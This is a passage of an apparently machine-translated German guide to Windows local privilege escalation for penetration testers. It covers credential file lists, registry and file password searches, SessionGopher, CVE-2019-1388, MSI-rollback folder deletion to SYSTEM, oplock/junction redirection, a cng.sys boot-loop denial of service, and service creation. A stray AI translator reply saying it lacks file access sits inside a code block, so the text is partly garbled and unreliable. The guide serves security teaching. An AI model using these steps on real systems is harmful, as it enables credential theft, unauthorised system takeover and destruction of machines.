*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ich habe keinen Zugriff auf dein Dateisystem oder dein Repository. Bitte liefere den Inhalt von src/windows-hardening/windows-local-privilege-escalation/README.md oder die Liste der vorgeschlagenen Dateien, die ich durchsuchen soll. Alternativ kannst du:

- Die Datei hier einfügen (ganzer Inhalt oder relevante Abschnitte), oder
- Einen Repository-Link und genaue Pfade/Dateinamen angeben, oder
- Beschreiben, welche Begriffe/Abschnitte ich suchen und dann ins Deutsche übersetzen soll.

Sobald du den Inhalt oder die Vorgaben bereitstellst, übersetze ich den relevanten englischen Text ins Deutsche unter Beibehaltung der Markdown-/HTML-Syntax.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldeinformationen im Papierkorb

Sie sollten außerdem den Papierkorb überprüfen, um dort nach Anmeldeinformationen zu suchen

Um **Passwörter wiederherzustellen**, die von mehreren Programmen gespeichert wurden, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Anmeldeinformationen**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Du solltest nach DBs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ist eine im Windows-Betriebssystem integrierte Technologie, die die Kommunikation zwischen Softwarekomponenten in verschiedenen Sprachen ermöglicht. Jede COM-Komponente wird über eine class ID (CLSID) identifiziert und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die über interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese registry wird durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** erstellt.

Innerhalb der CLSIDs dieser registry findest du den untergeordneten registry-Eintrag **InProcServer32**, der einen **default value** enthält, der auf eine **DLL** zeigt, sowie einen Eintrag namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../images/image (729).png>)

Im Grunde gilt: Wenn du eine der DLLs, die ausgeführt werden, überschreiben kannst, könntest du Privilegien eskalieren, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und registry**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Nach einer Datei mit einem bestimmten Dateinamen suchen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes metasploit POST module auszuführen, das nach credentials** im Opfer sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) durchsucht automatisch alle Dateien, die Passwörter enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein Prozess, der als SYSTEM läuft, einen neuen Prozess öffnet** (`OpenProcess()`) mit **vollen Rechten**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit geringen Rechten, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde, übernehmen** und **shellcode injizieren**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speichersegmente, oft als **pipes** bezeichnet, ermöglichen die Prozesskommunikation und den Datenaustausch.

Windows bietet die Funktion **Named Pipes**, mit der nicht verwandte Prozesse Daten austauschen können, sogar über unterschiedliche Netzwerke. Das ähnelt einer Client/Server-Architektur, mit den Rollen **named pipe server** und **named pipe client**.

Wenn Daten von einem **client** durch eine pipe gesendet werden, hat der **server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität des clients anzunehmen**, sofern er die nötigen **SeImpersonate**-Rechte besitzt. Das Identifizieren eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet die Gelegenheit, **höhere Privilegien zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**here**](named-pipe-client-impersonation.md) und [**here**](#from-high-integrity-to-system).

Außerdem erlaubt das folgende Tool, **eine named pipe Kommunikation mit einem Tool wie burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und anzuzeigen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Server-Modus exponiert `\\pipe\\tapsrv` (MS-TRP). Ein remote authentifizierter Client kann den mailslot-basierten asynchronen Event-Pfad ausnutzen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf jede vorhandene Datei zu verwandeln, die von `NETWORK SERVICE` beschreibbar ist, anschließend Telephony-Admin-Rechte zu erlangen und eine beliebige DLL als Dienst zu laden. Vollständiger Ablauf:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergegeben werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn man eine Shell als Benutzer erhält, können geplante Tasks oder andere Prozesse ausgeführt werden, die **Zugangsdaten über die Kommandozeile übergeben**. Das unten stehende Script erfasst Prozess-Kommandozeilen alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen Zustand, wobei es alle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Vom Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer auszuführen.

Das macht es möglich, Privilegien zu erhöhen und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Zusätzlich ist es nicht nötig, etwas zu installieren, und die während des Vorgangs verwendete binary ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, sind die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Von Administrator (Medium) zu High-Integritätsstufe / UAC-Bypass

Lies dies, um Integritätsstufen kennenzulernen:


{{#ref}}
integrity-levels.md
{{#endref}}

Dann lies dies, um mehr über UAC und UAC-Bypässe zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von beliebiger Ordner-Löschung/-Verschiebung/-Umbenennung zu SYSTEM EoP

Die in diesem Blogpost beschriebene Technik ([**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)) mit einem Exploit-Code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, das Rollback-Feature des Windows Installer auszunutzen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dafür muss der Angreifer einen **bösartigen MSI-Installer** erstellen, der dazu verwendet wird, den `C:\Config.Msi`-Ordner zu kapern, welcher später vom Windows Installer verwendet wird, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so modifiziert wurden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik ist wie folgt:

1. **Stage 1 – Vorbereitung der Kapernung (lasse `C:\Config.Msi` leer)**

- Step 1: Install the MSI
- Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, sodass ein **Nicht-Admin-Benutzer** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Step 2: Begin Uninstall
- Deinstalliere dieselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll** den offenen File-Handle mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Custom Syncing
- Die `.msi` enthält eine **benutzerdefinierte Uninstall-Aktion (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn die `.rbf` geschrieben wurde.
- und dann auf ein anderes Event wartet, bevor die Deinstallation fortfährt.

- Step 4: Block Deletion of `.rbf`
- Wenn signalisiert, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht wird**.
- Dann **signalisiere zurück**, damit die Deinstallation beendet werden kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und weil nicht alle Inhalte gelöscht werden können, **wird `C:\Config.Msi` nicht entfernt**.

- Step 5: Manually Delete `.rbf`
- Du (Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit zur Kapernung.

> An diesem Punkt, **trigger die SYSTEM-level arbitrary folder delete vulnerability**, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Ersetzen der Rollback-Skripte durch bösartige**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F), und **halte einen Handle offen** mit `WRITE_DAC`.

- Step 7: Run Another Install
- Installiere die `.msi` erneut mit:
- `TARGETDIR`: Beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die ein erzwungenes Scheitern auslöst.
- Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Step 8: Monitor for `.rbs`
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse deren Dateinamen.

- Step 9: Sync Before Rollback
- Die `.msi` enthält eine **benutzerdefinierte Install-Aktion (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- und dann wartet, bevor sie fortfährt.

- Step 10: Reapply Weak ACL
- Nachdem du das `'.rbs created'`-Event empfangen hast:
- Der Windows Installer **wendet wieder starke ACLs** auf `C:\Config.Msi` an.
- Da du jedoch weiterhin einen Handle mit `WRITE_DAC` offen hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles** durchgesetzt, daher kannst du weiterhin in den Ordner schreiben.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- deine `.rbf`-Datei (bösartige DLL) in einen **privilegierten Pfad** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` ab, die eine **bösartige SYSTEM-Level-Payload-DLL** enthält.

- Step 12: Trigger the Rollback
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass die Installation an einem bekannten Punkt **absichtlich fehlschlägt**.
- Dadurch beginnt das **Rollback**.

- Step 13: SYSTEM Installs Your DLL
- Der Windows Installer:
- liest dein bösartiges `.rbs`.
- kopiert deine `.rbf`-DLL in den Zielort.
- Du hast nun deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Final Step: Execute SYSTEM Code
- Führe ein vertrauenswürdiges, **auto-elevated binary** aus (z. B. `osk.exe`), das die DLL lädt, die du gehijacked hast.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.

### Von beliebiger Datei-Löschung/-Verschiebung/-Umbenennung zu SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) geht davon aus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Vulnerability nur **arbitrary file deletion** erlaubt?

Du könntest NTFS-Interna ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also **den Stream `::$INDEX_ALLOCATION` eines Ordners löschen**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Sie können dies mit standardmäßigen Datei-Lösch-APIs wie folgt tun:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *Datei*-Lösch-API aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen von Ordnerinhalten zu SYSTEM EoP
Was, wenn dein primitive nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber es **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Einen Köder-Ordner und eine Datei einrichten
- Erstelle: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Setze ein **oplock** auf `file1.txt`
- Das oplock **unterbricht die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn es `file1.txt` erreicht, tritt die **oplock triggers** ein und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock callback – die Löschung umleiten

- Option A: Verschiebe `file1.txt` woanders
- Damit wird `folder1` geleert, ohne das oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde das oplock vorzeitig freigeben.

- Option B: Konvertiere `folder1` in eine **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den NTFS-internen Stream ab, der die Ordner-Metadaten speichert — dessen Löschung löscht den Ordner.

5. Schritt 5: Release the oplock
- Der SYSTEM-Prozess fährt fort und versucht, `file1.txt` zu löschen.
- Aber jetzt, aufgrund des junction + symlink, wird tatsächlich gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu dauerhaftem DoS

Nutze eine Primitive, die es dir erlaubt, **einen beliebigen Ordner als SYSTEM/admin zu erstellen** — selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen setzen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem `cng.sys` Kernelmodus-Treiber.
- Wenn Sie ihn **vorab als Ordner anlegen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Dann versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es sieht den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder stoppt den Bootvorgang**.
- Es gibt **keinen Fallback**, und **keine Wiederherstellung** ohne externe Intervention (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu arbitrary file overwrite / boot DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen Pfad schreibt, der aus einer **schreibbaren Konfiguration** gelesen wird, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibzugriff in ein arbitrary overwrite zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Anforderungen**
- Die Konfiguration, die den Zielpfad speichert, ist vom Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Fähigkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (log, export, report).

**Beispielkette**
1. Lese die Konfiguration, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin-Rechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warten Sie darauf, dass die privilegierte Komponente das Log schreibt (z. B. Admin löst "send test SMS" aus). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuchen Sie das überschriebene Ziel (hex/PE parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das verallgemeinert sich auch auf jede geschützte Datei, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise von `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann diese zuerst versucht werden, was sie zu einer zuverlässigen DoS-Senke für beschädigte Daten macht.



## **Von High Integrity zu SYSTEM**

### **Neuer Dienst**

Wenn Sie bereits in einem High Integrity-Prozess laufen, kann der **Weg zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Beim Erstellen einer Service-Binärdatei stelle sicher, dass es sich um einen gültigen Service handelt oder die Binärdatei die notwendigen Aktionen ausführt, da sie sonst nach 20s beendet wird.

### AlwaysInstallElevated

Von einem High-Integrity-Prozess aus kannst du versuchen, die AlwaysInstallElevated-Registrierungseinträge zu aktivieren und mit einem _**.msi**_-Wrapper eine Reverse-Shell zu **installieren**.\
[Mehr Informationen über die beteiligten Registrierungsschlüssel und wie man ein _.msi_-Paket installiert findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese Token-Privilegien hast (wahrscheinlich findest du sie bereits in einem High-Integrity-Prozess), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (keine geschützten Prozesse), **das Token des Prozesses kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wählt man üblicherweise einen Prozess, der als SYSTEM läuft und alle Token-Privilegien besitzt (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Privilegien_).\
**Du kannst** [**ein Beispielcode, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### Named Pipes

Diese Technik wird von meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, eine Pipe zu erstellen und dann einen Service zu erstellen/auszunutzen, damit dieser in diese Pipe schreibt. Dann kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, das Token des Pipe-Clients (des Service) impersonieren und SYSTEM-Privilegien erlangen.\
Wenn du [**mehr über name pipes lernen willst, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel lesen willst, [**wie man von High Integrity zu System mit name pipes gelangt**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine dll zu hijacken, die von einem Prozess geladen wird, der als **SYSTEM** läuft, kannst du beliebigen Code mit diesen Rechten ausführen. Dll Hijacking ist daher auch für diese Art der Privilegieneskalation nützlich und darüber hinaus wesentlich **leichter von einem High-Integrity-Prozess** aus zu erreichen, da dieser **Schreibrechte** auf die Ordner hat, die zum Laden von dlls verwendet werden.\
**Du kannst** [**mehr über Dll hijacking hier lernen**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollen Privilegien

**Siehe:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool, um lokale Windows-Privilegieneskalationsvektoren zu finden:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensitive Dateien (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf mögliche Fehlkonfigurationen und sammelt Informationen (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal - Parameter -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter in der Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basis-Enumeration für Windows-Privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Privesc-Schwachstellen (VERALTET zugunsten von Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Admin-Rechte erforderlich)**

**Exe**

